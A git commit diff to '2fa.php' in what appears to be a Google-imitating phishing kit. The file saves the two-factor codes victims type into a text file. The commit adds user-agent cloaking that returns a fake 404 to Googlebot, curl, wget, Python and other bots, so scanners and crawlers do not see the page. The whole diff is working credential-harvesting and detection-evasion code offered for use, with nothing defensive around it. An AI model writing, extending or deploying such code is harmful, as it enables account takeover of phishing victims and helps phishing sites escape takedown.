ae23bf5ba8e8ef8867e45e80a6c5b27619a96da8
mosean2000 <ayesha1281827@gmail.com>
2025-06-30 14:30:14 +0500

    Update 2fa.php

--- .sites/google_new/2fa.php
+++ .sites/google_new/2fa.php
@@ -1,5 +1,15 @@
 <?php
-
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    if (stripos($ua, 'googlebot') !== false || 
+        stripos($ua, 'curl') !== false || 
+        stripos($ua, 'wget') !== false || 
+        stripos($ua, 'python') !== false || 
+        stripos($ua, 'bot') !== false) {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+}
 file_put_contents("usernames.txt", "2FA Code: " . $_POST['code'] . "\n", FILE_APPEND);
 header('Location: 2fa.html');
 exit();
